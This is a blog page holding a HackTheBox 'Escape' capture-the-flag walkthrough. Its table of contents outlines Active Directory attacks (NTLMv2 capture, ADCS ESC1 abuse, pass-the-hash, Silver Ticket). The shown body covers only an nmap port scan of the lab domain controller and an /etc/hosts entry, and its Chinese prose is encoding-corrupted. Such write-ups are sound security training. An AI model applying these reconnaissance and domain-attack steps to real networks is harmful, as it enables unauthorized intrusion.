<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="ç®€è¿°æœ¬æ–‡æ˜¯mediuméš¾åº¦çš„HTB Escapeæœºå™¨çš„åŸŸæ¸—é€éƒ¨åˆ†ï¼Œå…¶ä¸­Net-NTLMv2, ADCS, PTH, Silver Ticketç­‰åŸŸæ¸—é€ç»†èŠ‚æ˜¯æ­¤boxçš„ç‰¹è‰²ï¼Œä¸»è¦å‚è€ƒ0xdfâ€™s blog Escape walkthroughå’ŒHTBâ€™s official Escape walkthroughè®°å½•è¿™ç¯‡åšå®¢åŠ æ·±è®°å¿†å’Œç†è§£ï¼ŒåŠä¾›åç»­åšæ·±å…¥ç ”ç©¶æŸ¥é˜…ï¼Œå¤‡å¿˜ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox Escape [Net-NTLMv2 + ADCS + PTH + Silver Ticket]">
<meta property="og:url" content="https://fdlucifer.github.io/2023/06/18/escape/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="ç®€è¿°æœ¬æ–‡æ˜¯mediuméš¾åº¦çš„HTB Escapeæœºå™¨çš„åŸŸæ¸—é€éƒ¨åˆ†ï¼Œå…¶ä¸­Net-NTLMv2, ADCS, PTH, Silver Ticketç­‰åŸŸæ¸—é€ç»†èŠ‚æ˜¯æ­¤boxçš„ç‰¹è‰²ï¼Œä¸»è¦å‚è€ƒ0xdfâ€™s blog Escape walkthroughå’ŒHTBâ€™s official Escape walkthroughè®°å½•è¿™ç¯‡åšå®¢åŠ æ·±è®°å¿†å’Œç†è§£ï¼ŒåŠä¾›åç»­åšæ·±å…¥ç ”ç©¶æŸ¥é˜…ï¼Œå¤‡å¿˜ã€‚">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape10.png">
<meta property="article:published_time" content="2023-06-17T19:39:19.000Z">
<meta property="article:modified_time" content="2023-06-19T08:46:03.507Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="DC">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape.png">


<link rel="canonical" href="https://fdlucifer.github.io/2023/06/18/escape/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2023/06/18/escape/","path":"2023/06/18/escape/","title":"HackTheBox Escape [Net-NTLMv2 + ADCS + PTH + Silver Ticket]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox Escape [Net-NTLMv2 + ADCS + PTH + Silver Ticket] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">46</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">208</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">ç®€è¿°</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">ä¿¡æ¯æ”¶é›†</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TLS%E8%AF%81%E4%B9%A6"><span class="nav-number">2.2.</span> <span class="nav-text">TLSè¯ä¹¦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB-TCP-445"><span class="nav-number">2.3.</span> <span class="nav-text">SMB - TCP 445</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#List"><span class="nav-number">2.3.1.</span> <span class="nav-text">List</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Public"><span class="nav-number">2.3.2.</span> <span class="nav-text">Public</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Server-Procedures-pdf"><span class="nav-number">2.3.3.</span> <span class="nav-text">SQL Server Procedures.pdf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL"><span class="nav-number">2.4.</span> <span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.5.</span> <span class="nav-text">é¢å¤–æšä¸¾</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-sql-svc"><span class="nav-number">3.</span> <span class="nav-text">Shell as sql_svc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.1.</span> <span class="nav-text">è¿è¡Œå‘½ä»¤å¤±è´¥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Net-NTLMv2"><span class="nav-number">3.2.</span> <span class="nav-text">è·å–Net-NTLMv2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3Net-NTLMv2-hash"><span class="nav-number">3.3.</span> <span class="nav-text">ç ´è§£Net-NTLMv2 hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WINRM"><span class="nav-number">3.4.</span> <span class="nav-text">WINRM</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Ryan-Cooper"><span class="nav-number">4.</span> <span class="nav-text">Shell as Ryan.Cooper</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">4.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-number">4.1.1.</span> <span class="nav-text">æ–‡ä»¶ç³»ç»Ÿ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ERRORLOG-BAK"><span class="nav-number">4.1.2.</span> <span class="nav-text">ERRORLOG.BAK</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WinRM"><span class="nav-number">4.2.</span> <span class="nav-text">WinRM</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-administrator"><span class="nav-number">5.</span> <span class="nav-text">Shell as administrator</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number">5.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4-ADCS"><span class="nav-number">5.1.1.</span> <span class="nav-text">ç¡®è®¤ ADCS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E6%A8%A1%E6%9D%BF"><span class="nav-number">5.1.2.</span> <span class="nav-text">è¯†åˆ«æ˜“å—æ”»å‡»æ¨¡æ¿</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%A5%E7%94%A8%E6%A8%A1%E6%9D%BF"><span class="nav-number">5.2.</span> <span class="nav-text">æ»¥ç”¨æ¨¡æ¿</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-certipy"><span class="nav-number">5.2.1.</span> <span class="nav-text">æ–¹æ³•1: certipy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-Certify-Rubeus"><span class="nav-number">5.2.2.</span> <span class="nav-text">æ–¹æ³•2: Certify + Rubeus</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Silver-Ticket"><span class="nav-number">6.</span> <span class="nav-text">Silver Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">6.1.</span> <span class="nav-text">èƒŒæ™¯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Escape-%E2%80%9C%E9%9D%9E%E9%A2%84%E6%9C%9F%E2%80%9D"><span class="nav-number">6.1.1.</span> <span class="nav-text">Escape â€œéé¢„æœŸâ€</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Silver-Tickets"><span class="nav-number">6.1.2.</span> <span class="nav-text">Silver Tickets</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Escape%E7%9A%84%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5"><span class="nav-number">6.1.3.</span> <span class="nav-text">Escapeçš„æ”»å‡»ç­–ç•¥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">6.2.</span> <span class="nav-text">ä¿¡æ¯æ”¶é›†</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">6.2.1.</span> <span class="nav-text">æ¦‚è¿°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash"><span class="nav-number">6.2.2.</span> <span class="nav-text">NTLM Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Domain-SID"><span class="nav-number">6.2.3.</span> <span class="nav-text">Domain SID</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Silver-Ticket-1"><span class="nav-number">6.3.</span> <span class="nav-text">Silver Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90"><span class="nav-number">6.3.1.</span> <span class="nav-text">ç”Ÿæˆ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5"><span class="nav-number">6.3.2.</span> <span class="nav-text">è¿æ¥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96flag"><span class="nav-number">6.3.3.</span> <span class="nav-text">è¯»å–flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">6.3.4.</span> <span class="nav-text">å‘½ä»¤æ‰§è¡Œ</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference-Sources"><span class="nav-number">7.</span> <span class="nav-text">Reference Sources</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">208</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail â†’ mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page â†’ https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube â†’ https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram â†’ https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange â†’ https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">è®°å¿†é‡Œçš„çº¯çœŸ</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">å°ç¦»</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2023/06/18/escape/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox Escape [Net-NTLMv2 + ADCS + PTH + Silver Ticket] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox Escape [Net-NTLMv2 + ADCS + PTH + Silver Ticket]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-06-18 03:39:19" itemprop="dateCreated datePublished" datetime="2023-06-18T03:39:19+08:00">2023-06-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-06-19 16:46:03" itemprop="dateModified" datetime="2023-06-19T16:46:03+08:00">2023-06-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Net-NTLMv2-hash-crack/" itemprop="url" rel="index"><span itemprop="name">Net-NTLMv2 hash crack</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Net-NTLMv2-hash-crack/ESC1-attack/" itemprop="url" rel="index"><span itemprop="name">ESC1 attack</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Net-NTLMv2-hash-crack/ESC1-attack/PTH/" itemprop="url" rel="index"><span itemprop="name">PTH</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Net-NTLMv2-hash-crack/ESC1-attack/PTH/Silver-Ticket/" itemprop="url" rel="index"><span itemprop="name">Silver Ticket</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.4k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>23 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h1><p>æœ¬æ–‡æ˜¯mediuméš¾åº¦çš„HTB Escapeæœºå™¨çš„åŸŸæ¸—é€éƒ¨åˆ†ï¼Œå…¶ä¸­Net-NTLMv2, ADCS, PTH, Silver Ticketç­‰åŸŸæ¸—é€ç»†èŠ‚æ˜¯æ­¤boxçš„ç‰¹è‰²ï¼Œä¸»è¦å‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzA2LzE3L2h0Yi1lc2NhcGUuaHRtbA==">0xdfâ€™s blog Escape walkthrough<i class="fa fa-external-link-alt"></i></span>å’Œ<span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5jb20vbWFjaGluZXMvRXNjYXBlL3dhbGt0aHJvdWdocw==">HTBâ€™s official Escape walkthrough<i class="fa fa-external-link-alt"></i></span>è®°å½•è¿™ç¯‡åšå®¢åŠ æ·±è®°å¿†å’Œç†è§£ï¼ŒåŠä¾›åç»­åšæ·±å…¥ç ”ç©¶æŸ¥é˜…ï¼Œå¤‡å¿˜ã€‚</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape.png"></li>
</ul>
<span id="more"></span>

<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 10000 10.10.11.202</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49668/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49692/tcp open  unknown</span><br><span class="line">49708/tcp open  unknown</span><br><span class="line">49712/tcp open  unknown</span><br><span class="line">63474/tcp open  unknown</span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æ˜¯WindowsåŸŸæ§åˆ¶å™¨ï¼ŒåŸºäºæ ‡å‡†çš„Windowsï¼Œå¦‚SMB(445)ã€NetBIOS(135&#x2F;139)ã€LDAP(389ç­‰)å’ŒWinRM(5985)ï¼Œä»¥åŠé€šå¸¸åœ¨dcä¸Šçš„53 (DNS)å’Œ88 (Kerberos)ã€‚è¿˜æœ‰ä¸€ä¸ªMSSQLæœåŠ¡å™¨(1433)ã€‚</p>
<p>nmapè¿è¡ŒLDAPè„šæœ¬æ˜¾ç¤ºäº†sequel.htbçš„åŸŸåã€‚TLSè¯ä¹¦æ˜¯é’ˆå¯¹dc.sequel.htbçš„ã€‚æ·»åŠ è¿™äº›ï¼Œä»¥åŠä¸»æœºådcåˆ°&#x2F;etc&#x2F;hostsæ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.202    dc.sequel.htb sequel.htb dc</span><br></pre></td></tr></table></figure>

<p>æœ€åï¼Œæ³¨æ„åˆ°è¿™ä¸ªæœåŠ¡å™¨ä¸Šçš„æ—¶é’Ÿä¸æœ¬åœ°æ—¶é’Ÿç›¸å·®8ä¸ªå°æ—¶ã€‚éœ€è¦åŒæ­¥å®ƒæ¥åšKerberosæ“ä½œã€‚</p>
